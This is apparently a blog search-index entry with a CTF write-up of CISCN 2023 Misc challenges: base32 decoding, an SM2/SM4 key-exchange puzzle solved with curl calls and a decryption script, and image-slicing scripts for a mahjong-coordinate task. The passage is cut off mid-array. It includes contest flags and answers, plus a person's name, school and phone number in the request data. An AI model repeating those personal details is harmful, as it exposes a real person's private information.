<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ciscn2023 Misc部分复现</title>
    <link href="/2023/05/31/ciscn2023%20Misc%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/05/31/ciscn2023%20Misc%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="签到卡"><a href="#签到卡" class="headerlink" title="签到卡"></a>签到卡</h1><p>print(open(\falg).read)</p><p><img src="https://raw.githubusercontent.com/vcdogJT/blog-img/main/image-20230527105915198.png" alt="image-20230527105915198">s’sss</p><p>flag{3a373962-ee93-4144-b8e8-be71635d847d}</p><h1 id="被加密的生产流量"><a href="#被加密的生产流量" class="headerlink" title="被加密的生产流量"></a>被加密的生产流量</h1><p><img src="https://raw.githubusercontent.com/vcdogJT/blog-img/main/image-20230527102028580.png" alt="image-20230527102028580"></p><p>MMYWMX3GNEYWOXZRGAYDA&#x3D;&#x3D;&#x3D;</p><p><img src="https://raw.githubusercontent.com/vcdogJT/blog-img/main/image-20230527102202162.png" alt="image-20230527102202162">!(.&#x2F;image-20230527102202382.png)</p><p>base32</p><p>falg{c1f_fi1g_1000}</p><p>#国密</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl">curl -d <span class="hljs-string">&quot;name=%E5%90%B4%E9%94%A6%E5%A9%B7&amp;school=%E6%A1%82%E6%9E%97%E7%94%B5%E5%AD%90%E7%A7%91%E6%8A%80%E5%A4%A7%E5%AD%A6&amp;phone=17776224443&quot;</span> http:<span class="hljs-regexp">//</span><span class="hljs-number">39.105</span>.<span class="hljs-number">187.49</span>:<span class="hljs-number">37905</span>/api/login<br>&#123;<br>  <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;success&quot;</span>,<br>  <span class="hljs-string">&quot;data&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">&quot;cc4c813e-72de-48ba-a699-a5aeee0320c4&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -d <span class="hljs-string">&quot;id=cc4c813e-72de-48ba-a699-a5aeee0320c4&amp;publicKey=4f1e1ed015b433f6c414430b175d39f4c79c7708755c56a35b78f52513c238c36ea57f399457db99932fad880933f027a9822547ebcd81877f73e5b5e7a42cde&quot;</span> http:<span class="hljs-regexp">//</span><span class="hljs-number">39.105</span>.<span class="hljs-number">187.49</span>:<span class="hljs-number">37905</span><span class="hljs-regexp">/api/</span>allkey<br>&#123;<br>  <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;success&quot;</span>,<br>  <span class="hljs-string">&quot;data&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;publicKey&quot;</span>: <span class="hljs-string">&quot;043ce277aa211a9e6a4880460d2e512d7b59053780645af4c10dfe801152ff363a8041c93956c7c800a06157bc6a005609b0370b30e7bf35bc8d4dad0080730936&quot;</span>,<br>    <span class="hljs-string">&quot;privateKey&quot;</span>: <span class="hljs-string">&quot;7e460c8f947a91aa7fbb53503e71e4fed56e37d569746ea2e71d479bf95c4a41&quot;</span>,<br>    <span class="hljs-string">&quot;randomString&quot;</span>: <span class="hljs-string">&quot;ec6a0a4d1a292f79fba67743acd091d6c2aee7c3f6815f8af37eb3527617fd5950b005f17b060ad6602dec439177944007cbbd7e808d4b30385d51568d52988bf4cb8c94b55a90a9313cd961ce6b551b3b84b746cf81a107887ad9d1bcdb7e92b97f601c43891588bd7fbb1f7b72983a&quot;</span>,<br>    <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">&quot;cc4c813e-72de-48ba-a699-a5aeee0320c4&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -d <span class="hljs-string">&quot;id=cc4c813e-72de-48ba-a699-a5aeee0320c4&quot;</span> http:<span class="hljs-regexp">//</span><span class="hljs-number">39.105</span>.<span class="hljs-number">187.49</span>:<span class="hljs-number">37905</span><span class="hljs-regexp">/api/</span>quantum<br>&#123;<br>  <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;success&quot;</span>,<br>  <span class="hljs-string">&quot;data&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">&quot;cc4c813e-72de-48ba-a699-a5aeee0320c4&quot;</span>,<br>    <span class="hljs-string">&quot;quantumString&quot;</span>: <span class="hljs-string">&quot;b62b232f7b668582f5157fa8c0fc77e59662f420bf474363c57d93de6dd6b326512d9ffa42db6aa16b0201ec6b1bbdee0d733fe427a6d80c9f2a81e407e28b4664d80417fc8ae412dd49379b84333d13db17ac549f3e7fc46da485b7665beca2db7ca58665b318516f6b64b9c5d80929&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -d <span class="hljs-string">&quot;id=cc4c813e-72de-48ba-a699-a5aeee0320c4&amp;quantumString=e1a9e78da809d929c033db8c2e71c931&quot;</span> http:<span class="hljs-regexp">//</span><span class="hljs-number">39.105</span>.<span class="hljs-number">187.49</span>:<span class="hljs-number">37905</span><span class="hljs-regexp">/api/</span>check<br>&#123;<br>  <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;success&quot;</span>,<br>  <span class="hljs-string">&quot;data&quot;</span>: <span class="hljs-string">&quot;结果正确，请访问 /api/search获取您的 flag&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -d <span class="hljs-string">&quot;id=cc4c813e-72de-48ba-a699-a5aeee0320c4&quot;</span> http:<span class="hljs-regexp">//</span><span class="hljs-number">39.105</span>.<span class="hljs-number">187.49</span>:<span class="hljs-number">37905</span><span class="hljs-regexp">/api/</span>search<br>&#123;<br>  <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;success&quot;</span>,<br>  <span class="hljs-string">&quot;data&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">&quot;cc4c813e-72de-48ba-a699-a5aeee0320c4&quot;</span>,<br>    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;吴锦婷&quot;</span>,<br>    <span class="hljs-string">&quot;school&quot;</span>: <span class="hljs-string">&quot;桂林电子科技大学&quot;</span>,<br>    <span class="hljs-string">&quot;phone&quot;</span>: <span class="hljs-string">&quot;17776224443&quot;</span>,<br>    <span class="hljs-string">&quot;publicKey&quot;</span>: <span class="hljs-string">&quot;043ce277aa211a9e6a4880460d2e512d7b59053780645af4c10dfe801152ff363a8041c93956c7c800a06157bc6a005609b0370b30e7bf35bc8d4dad0080730936&quot;</span>,<br>    <span class="hljs-string">&quot;privateKey&quot;</span>: <span class="hljs-string">&quot;3dc0df5f768173d6b59ba705e5b7a9edf5e2f6280c968c618d1d255935c8040c&quot;</span>,<br>    <span class="hljs-string">&quot;randomString&quot;</span>: <span class="hljs-string">&quot;c0cb12025b65a487f168ab3bc45edd4e&quot;</span>,<br>    <span class="hljs-string">&quot;quantumStringServer&quot;</span>: <span class="hljs-string">&quot;e1a9e78da809d929c033db8c2e71c931&quot;</span>,<br>    <span class="hljs-string">&quot;quantumStringUser&quot;</span>: <span class="hljs-string">&quot;e1a9e78da809d929c033db8c2e71c931&quot;</span>,<br>    <span class="hljs-string">&quot;flag&quot;</span>: <span class="hljs-string">&quot;已完成考题，结果正确:flag&#123;1ae038cd-56fa-45f0-81e0-50034e3e9c39&#125;&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pysmx.SM2 <span class="hljs-keyword">import</span> generate_keypair,Encrypt,Decrypt<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long,long_to_bytes<br><span class="hljs-keyword">from</span> pysmx.SM4 <span class="hljs-keyword">import</span> Sm4,ENCRYPT,DECRYPT<br>len_para = <span class="hljs-number">64</span><br>hash_type = <span class="hljs-string">&#x27;sm3&#x27;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">pk,sk = generate_keypair(len_para)</span><br><span class="hljs-string">print(hex(bytes_to_long(pk))) #0x4f1e1ed015b433f6c414430b175d39f4c79c7708755c56a35b78f52513c238c36ea57f399457db99932fad880933f027a9822547ebcd81877f73e5b5e7a42cde</span><br><span class="hljs-string">print(pk)</span><br><span class="hljs-string">print(sk)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><br>pk = <span class="hljs-string">b&quot;O\x1e\x1e\xd0\x15\xb43\xf6\xc4\x14C\x0b\x17]9\xf4\xc7\x9cw\x08u\\V\xa3[x\xf5%\x13\xc28\xc3n\xa5\x7f9\x94W\xdb\x99\x93/\xad\x88\t3\xf0&#x27;\xa9\x82%G\xeb\xcd\x81\x87\x7fs\xe5\xb5\xe7\xa4,\xde&quot;</span><br>sk = <span class="hljs-string">b&#x27;b\x8d\x1a\x15\x89\xfbY\x96\r\x8e\x0e\xdd\xed\x10C+\xc2\xc9\x17\xc32\xad \xd9\x90\xbdH\xf2\xb6\x04Qh&#x27;</span><br><br><br>randomString = <span class="hljs-number">0xec6a0a4d1a292f79fba67743acd091d6c2aee7c3f6815f8af37eb3527617fd5950b005f17b060ad6602dec439177944007cbbd7e808d4b30385d51568d52988bf4cb8c94b55a90a9313cd961ce6b551b3b84b746cf81a107887ad9d1bcdb7e92b97f601c43891588bd7fbb1f7b72983a</span><br>m_str = Decrypt(long_to_bytes(randomString),sk,len_para,hash_algorithm=hash_type)<br><span class="hljs-built_in">print</span>(m_str) <span class="hljs-comment">#b&#x27;\xc0\xcb\x12\x02[e\xa4\x87\xf1h\xab;\xc4^\xddN&#x27; 随机数明文</span><br><br><span class="hljs-comment"># 解服务器秘钥明文</span><br>key = m_str<br>sm4 = Sm4()<br>Bskc = <span class="hljs-number">0x7e460c8f947a91aa7fbb53503e71e4fed56e37d569746ea2e71d479bf95c4a41</span><br>sm4.sm4_set_key(key,DECRYPT)<br>Bsk = sm4.sm4_crypt_ecb(long_to_bytes(Bskc))<br><span class="hljs-built_in">print</span>(Bsk)<br><span class="hljs-comment">#[61, 192, 223, 95, 118, 129, 115, 214, 181, 155, 167, 5, 229, 183, 169, 237, 245, 226, 246, 40, 12, 150, 140, 97, 141, 29, 37, 89, 53, 200, 4, 12]</span><br>s = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> Bsk:<br>    f = <span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(f) == <span class="hljs-number">1</span>:<br>        f = <span class="hljs-string">&#x27;0&#x27;</span>+ f<br>    <span class="hljs-built_in">print</span>(f)<br>    s = s + f<br><span class="hljs-built_in">print</span>(s)<br><span class="hljs-comment">#0x3dc0df5f768173d6b59ba75e5b7a9edf5e2f628c968c618d1d255935c84c</span><br>Bsk =<span class="hljs-number">0x3dc0df5f768173d6b59ba705e5b7a9edf5e2f6280c968c618d1d255935c8040c</span><br>B_c =<span class="hljs-number">0xb62b232f7b668582f5157fa8c0fc77e59662f420bf474363c57d93de6dd6b326512d9ffa42db6aa16b0201ec6b1bbdee0d733fe427a6d80c9f2a81e407e28b4664d80417fc8ae412dd49379b84333d13db17ac549f3e7fc46da485b7665beca2db7ca58665b318516f6b64b9c5d80929</span><br>B_m = Decrypt(long_to_bytes(B_c), long_to_bytes(Bsk),len_para,hash_algorithm=hash_type)<br><span class="hljs-built_in">print</span>(B_m) <span class="hljs-comment">#b&#x27;\xe1\xa9\xe7\x8d\xa8\t\xd9)\xc03\xdb\x8c.q\xc91&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(bytes_to_long(B_m)))<span class="hljs-comment">#0xe1a9e78da809d929c033db8c2e71c931</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/vcdogJT/blog-img/main/image-20230527142159534.png" alt="image-20230527142159534"></p><p><img src="https://raw.githubusercontent.com/vcdogJT/blog-img/main/image-20230527142209410.png" alt="image-20230527142209410"></p><h1 id="国粹"><a href="#国粹" class="headerlink" title="国粹"></a>国粹</h1><p>有可能是坐标啊</p><p>麻将宽度是53</p><p>麻将高度是73（通过因数分解）</p><p>然后就按照宽度和长度对长图进行处理</p><p>对 a，k</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br><span class="hljs-comment"># 打开原图片</span><br>img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;k.png&#x27;</span>)<br><br><span class="hljs-comment"># 切割后图片的宽度</span><br>width = <span class="hljs-number">53</span><br><br><span class="hljs-comment"># 获取原图片的大小</span><br>orig_width, height = img.size<br><br><span class="hljs-comment"># 计算需要切割出几张图片</span><br>num_slices = orig_width // width + (<span class="hljs-number">1</span> <span class="hljs-keyword">if</span> orig_width % width <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># 循环切割并保存图片</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_slices):<br>    <span class="hljs-comment"># 计算当前切割位置</span><br>    left = i * width<br>    right = <span class="hljs-built_in">min</span>((i + <span class="hljs-number">1</span>) * width, orig_width)<br><br>    <span class="hljs-comment"># 切割图片</span><br>    <span class="hljs-built_in">slice</span> = img.crop((left, <span class="hljs-number">0</span>, right, height))<br><br>    <span class="hljs-comment"># 保存切割后的图片</span><br>    <span class="hljs-built_in">slice</span>.save(<span class="hljs-string">f&#x27;k/<span class="hljs-subst">&#123;i&#125;</span>.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p>对题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">slice_image_vertically</span>(<span class="hljs-params">image_path, slice_height</span>):<br>    <span class="hljs-comment"># 打开图片</span><br>    <span class="hljs-keyword">with</span> Image.<span class="hljs-built_in">open</span>(image_path) <span class="hljs-keyword">as</span> img:<br><br>        <span class="hljs-comment"># 获取图片宽度和高度</span><br>        width, height = img.size<br><br>        <span class="hljs-comment"># 计算需要切割几个块</span><br>        num_slices = height // slice_height<br><br>        <span class="hljs-comment"># 切割并保存所有的块</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_slices):<br>            box = (<span class="hljs-number">0</span>, i * slice_height, width, (i + <span class="hljs-number">1</span>) * slice_height)<br>            <span class="hljs-built_in">slice</span> = img.crop(box)<br>            <span class="hljs-built_in">slice</span>.save(<span class="hljs-string">f&quot;t\&#123;i&#125;.png&quot;</span>)<br><br><span class="hljs-comment"># 示例用法</span><br>slice_image_vertically(<span class="hljs-string">&quot;t.png&quot;</span>, <span class="hljs-number">73</span>)<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/vcdogJT/blog-img/main/image-20230527165324258.png" alt="image-20230527165324258"></p><p><img src="https://raw.githubusercontent.com/vcdogJT/blog-img/main/image-20230527165335807.png" alt="image-20230527165335807"></p><p><img src="https://raw.githubusercontent.com/vcdogJT/blog-img/main/image-20230527165352393.png" alt="image-20230527165352393"></p><p>思想就是</p><p>其实就是42x42的坐标，一万代表1…菊牌代表42</p><p>那么我们假设a是点的x的坐标合集，k是点y坐标的合集</p><p>那么就是进行图片的比对</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">same</span>(<span class="hljs-params">img1,img2</span>):<br>    <span class="hljs-comment"># 读取两张图片</span><br>    <span class="hljs-comment"># img1 = cv2.imread(f&#x27;t/y/1.png&#x27;)</span><br>    <span class="hljs-comment"># img2 = cv2.imread(f&#x27;a/3.png&#x27;)</span><br><br>    <span class="hljs-comment"># 将两张图片转换为灰度图像</span><br>    gray1 = cv2.cvtColor(img1, cv2.COLOR_BGR2GRAY)<br>    gray2 = cv2.cvtColor(img2, cv2.COLOR_BGR2GRAY)<br><br>    <span class="hljs-comment"># 对两张灰度图像进行直方图均衡化处理</span><br>    equ1 = cv2.equalizeHist(gray1)<br>    equ2 = cv2.equalizeHist(gray2)<br><br>    <span class="hljs-comment"># 比较两张图像的相似性</span><br>    res = cv2.matchTemplate(equ1, equ2, cv2.TM_CCOEFF_NORMED)<br>    similarity = res[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;相似度：&quot;</span>, similarity)<br>    <span class="hljs-keyword">if</span> similarity &gt;= <span class="hljs-number">0.9</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br><br><span class="hljs-comment"># img1 = cv2.imread(f&#x27;t/x/4.png&#x27;)</span><br><span class="hljs-comment"># img2 = cv2.imread(f&#x27;k/0.png&#x27;)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># same(img1,img2)</span><br><br><br><br><br>a = []<br>k = []<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment"># for i in range(0,341):</span><br>    <span class="hljs-comment">#     img1 = cv2.imread(f&#x27;a/&#123;i&#125;.png&#x27;)</span><br>    <span class="hljs-comment">#     for _ in range(1,43):</span><br>    <span class="hljs-comment">#         img2 = cv2.imread(f&#x27;t/x/&#123;_&#125;.png&#x27;)</span><br>    <span class="hljs-comment">#         if same(img1,img2):</span><br>    <span class="hljs-comment">#             a.append(_)</span><br>    <span class="hljs-comment">#         else:</span><br>    <span class="hljs-comment">#             pass</span><br>    <span class="hljs-comment">#</span><br>    <span class="hljs-comment"># for i in range(0,341):</span><br>    <span class="hljs-comment">#     img1 = cv2.imread(f&#x27;k/&#123;i&#125;.png&#x27;)</span><br>    <span class="hljs-comment">#     for _ in range(1,43):</span><br>    <span class="hljs-comment">#         img2 = cv2.imread(f&#x27;t/x/&#123;_&#125;.png&#x27;)</span><br>    <span class="hljs-comment">#         if same(img1,img2):</span><br>    <span class="hljs-comment">#             k.append(_)</span><br>    <span class="hljs-comment">#         else:</span><br>    <span class="hljs-comment">#             pass</span><br>    <span class="hljs-comment">#</span><br>    <span class="hljs-comment"># print(a)</span><br>    <span class="hljs-comment"># print(k)</span><br>    a = [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">7</span>, <span class="hljs-number">7</span>, <span class="hljs-number">7</span>, <span class="hljs-number">7</span>, <span class="hljs-number">7</span>, <span class="hljs-number">7</span>, <span class="hljs-number">7</span>, <span class="hljs-number">7</span>, <span class="hljs-number">7</span>, <span class="hljs-number">7</span>, <span class="hljs-number">7</span>, <span class="hljs-number">7</span>, <span class="hljs-number">7</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">10</span>, <span class="hljs-number">12</span>, <span class="hljs-number">12</span>, <span class="hljs-number">12</span>, <span class="hljs-number">12</span>, <span class="hljs-number">13</span>, <span class="hljs-number">13</span>, <span class="hljs-number">13</span>, <span class="hljs-number">13</span>, <span class="hljs-number">13</span>, <span class="hljs-number">13</span>, <span class="hljs-number">13</span>, <span class="hljs-number">13</span>, <span class="hljs-number">13</span>, <span class="hljs-number">13</span>, <span class="hljs-number">13</span>, <span class="hljs-number">13</span>, <span class="hljs-number">13</span>, <span class="hljs-number">13</span>, <span class="hljs-number">14</span>, <span class="hljs-number">14</span>, <span class="hljs-number">14</span>, <span class="hljs-number">14</span>, <span class="hljs-number">14</span>, <span class="hljs-number">14</span>, <span class="hljs-number">14</span>, <span class="hljs-number">14</span>, <span class="hljs-number">15</span>, <span class="hljs-number">15</span>, <span class="hljs-number">15</span>, <span class="hljs-number">15</span>, <span class="hljs-number">15</span>, <span class="hljs-number">15</span>, <span class="hljs-number">15</span>, <span class="hljs-number">16</span>, <span class="hljs-number">16</span>, <span class="hljs-number">16</span>, <span class="hljs-number">16</span>, <span class="hljs-number">16</span>, <span class="hljs-number">16</span>, <span class="hljs-number">16</span>, <span class="hljs-number">16</span>, <span class="hljs-number">17</span>, <span class="hljs-number">17</span>, <span class="hljs-number">17</span>, <span class="hljs-number">17</span>, <span class="hljs-number">17</span>, <span class="hljs-number">17</span>, <span class="hljs-number">17</span>, <span class="hljs-number">17</span>, <span class="hljs-number">18</span>, <span class="hljs-number">18</span>, <span class="hljs-number">18</span>, <span class="hljs-number">18</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">19</span>, <span class="hljs-number">19</span>, <span class="hljs-number">19</span>, <span class="hljs-number">19</span>, <span class="hljs-number">19</span>, <span class="hljs-number">19</span>, <span class="hljs-number">19</span>, <span class="hljs-number">19</span>, <span class="hljs-number">19</span>, <span class="hljs-number">19</span>, <span class="hljs-number">19</span>, <span class="hljs-number">19</span>, <span class="hljs-number">19</span>, <span class="hljs-number">19</span>, <span class="hljs-number">19</span>, <span class="hljs-number">19</span>, <span class="hljs-number">20</span>, <span class="hljs-number">20</span>, <span class="hljs-number">22</span>, <span class="hljs-number">22</span>, <span class="hljs-number">22</span>, <span class="hljs-number">22</span>, <span class="hljs-number">22</span>, <span class="hljs-number">22</span>, <span class="hljs-number">22</span>, <span class="hljs-number">22</span>, <span class="hljs-number">22</span>, <span class="hljs-number">22</span>, <span class="hljs-number">22</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>, <span class="hljs-number">24</span>, <span class="hljs-number">24</span>, <span class="hljs-number">24</span>, <span class="hljs-number">24</span>, <span class="hljs-number">24</span>, <span class="hljs-number">24</span>, <span class="hljs-number">24</span>, <span class="hljs-number">24</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">25</span>, <span class="hljs-number">25</span>, <span class="hljs-number">25</span>, <span 